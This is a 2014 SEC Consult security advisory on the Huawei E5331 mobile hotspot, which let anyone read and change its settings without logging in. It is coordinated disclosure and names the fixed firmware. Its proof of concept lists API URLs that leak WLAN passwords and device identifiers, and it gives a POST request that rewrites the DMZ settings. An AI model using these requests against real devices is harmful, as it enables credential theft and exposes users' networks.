@@ -1,0 +1,180 @@
+SEC Consult Vulnerability Lab Security Advisory < 20140307-0 >
+=======================================================================
+              title: Unauthenticated access & manipulation of settings 
+            product: Huawei E5331 MiFi mobile hotspot
+ vulnerable version: Software version 21.344.11.00.414
+      fixed version: Software version 21.344.27.00.414
+             impact: High
+           homepage: http://www.huawei.com
+              found: 2013-12-06
+                 by: J. Greil
+                     SEC Consult Vulnerability Lab 
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Huawei E5331 Mobile WiFi is a high-speed packet access mobile hotspot. It is a
+multi-mode wireless terminal for SOHO (Small Office and Home Office) and
+business professionals.
+
+You can connect the E5331 with the USB interface of a computer, or connect the
+E5331 with the Wi-Fi. In the service area of the HSPA+/HSPA/UMTS/EDGE/GPRS/GSM
+network, you can surf the Internet and send/receive messages/emails
+cordlessly. The E5331 is fast, reliable, and easy to operate. Thus, mobile
+users can experience many new features and services with the E5331. These
+features and services will enable a large number of users to use the E5331 and
+the average revenue per user (ARPU) of operators will increase substantially."
+
+source:
+http://www.huaweidevice.com/worldwide/productFeatures.do?pinfoId=3272&directoryId=5009&treeId=3619&tab=0
+
+
+Business recommendation:
+------------------------
+All discovered vulnerabilities can be exploited without authentication and
+therefore pose a high security risk.
+
+The scope of the test, where the vulnerabilities have been identified, was a
+very short crash-test of the device. It is assumed that further
+vulnerabilities exist within this product!
+
+The recommendation of SEC Consult is to perform follow-up security tests of
+this device and similar devices.
+
+
+Vulnerability overview/description:
+-----------------------------------
+Unauhenticated attackers are able to gain access to sensitive configuration
+(e.g. WLAN passwords in clear text or IMEI information of the SIM card) and
+even manipulate all settings in the web administration interface! This also
+works when the "Enable firewall" feature is set in "Firewall Switch" settings
+of the web interface.
+
+This can even be exploited remotely via Internet depending on the mobile
+operator setup. E.g. if the operator allows incoming connections for mobile
+networks, the web interface would be accessible and exploitable publicly.
+
+Otherwise those settings can be manipulated via CSRF attacks too. The DNS name
+"mobilewifi.home" can be used regardless of the IP address settings.
+
+
+Proof of concept:
+-----------------
+An attacker simply needs to access certain URLs of the web interface in order
+to receive the configuration. No authentication is needed!
+
+URL for retrieving wireless passwords / PSK in clear text:
+http://mobilewifi.home/api/wlan/security-settings
+
+XML response:
+<?xml version="1.0" encoding="UTF-8"?>
+<response>
+<WifiAuthmode>WPA2-PSK</WifiAuthmode>
+<WifiBasicencryptionmodes>NONE</WifiBasicencryptionmodes>
+<WifiWpaencryptionmodes>AES</WifiWpaencryptionmodes>
+<WifiWepKey1>12345</WifiWepKey1>
+<WifiWepKey2>12345</WifiWepKey2>
+<WifiWepKey3>12345</WifiWepKey3>
+<WifiWepKey4>12345</WifiWepKey4>
+<WifiWepKeyIndex>1</WifiWepKeyIndex>
+<WifiWpapsk>XXXXX</WifiWpapsk>
+<WifiWpsenbl>0</WifiWpsenbl>
+<WifiWpscfg>1</WifiWpscfg>
+<WifiRestart>1</WifiRestart>
+</response>
+
+
+Further interesting URLs to retrieve information from (not complete):
+http://mobilewifi.home/api/wlan/wps (WPS pin)
+http://mobilewifi.home/api/security/dmz (DMZ host settings)
+http://mobilewifi.home/api/pin/simlock (enable SIM lock)
+http://mobilewifi.home/api/wlan/host-list (connected wireless clients)
+http://mobilewifi.home/api/device/information (IMEI, MAC, etc)
+[...]
+
+
+In order to change settings it is also simply possible to issue POST requests
+to the specific URLs. E.g. change the "DMZ Settings" in order to make internal
+clients (client IP addresses can be retrieved through the host-list from above)
+reachable from the outside:
+
+POST /api/security/dmz HTTP/1.1
+Host: mobilewifi.home
+
+<?xml version="1.0"
+encoding="UTF-8"?><request><DmzStatus>1</DmzStatus><DmzIPAddress>A.B.C.D</DmzIPAddress></request>
+
+
+All those requests can either be issued via CSRF or also from the Internet, if
+the web interface of the device is reachable (depends on the mobile operator 
+settings).
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version of the device has been tested which was the latest
+version available at the time of identification of the flaw (the automatic
+update feature did not supply any new version):
+
+Software version: 21.344.11.00.414
+Web UI version: 11.001.07.00.03
+
+
+Vendor contact timeline:
+------------------------
+2013-12-11: Contacting vendor through psirt@huawei.com
+2013-12-12: Reply from vendor
+2013-12-18: Vendor requests some further details, sending answer
+2014-01-09: Vendor: problem will be resolved in new firmware version
+2014-01-14: Patch is planned for 6th March 2014
+2014-03-07: SEC Consult releases coordinated security advisory
+
+
+Solution:
+---------
+According to the vendor the following firmware release fixes the identified
+problems:
+* Software version 21.344.27.00.414
+
+It contains the following improvements according to the vendor:
+1. Users cannot obtain or set any device parameter without logging in.
+2. Added server-side authentication to discard illegitimate packets.
+
+
+The firmware can be downloaded from here:
+http://consumer.huawei.com/en/support/downloads/index.htm
+
+The item is called: E5331Update_21.344.27.00.414.B757
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius
+
+Headquarter:
+Mooslackengasse 17, 1190 Vienna, Austria
+Phone:   +43 1 8903043 0
+Fax:     +43 1 8903043 15
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+Interested in working with the experts of SEC Consult?
+Write to career@sec-consult.com
+
+EOF J. Greil / @2014
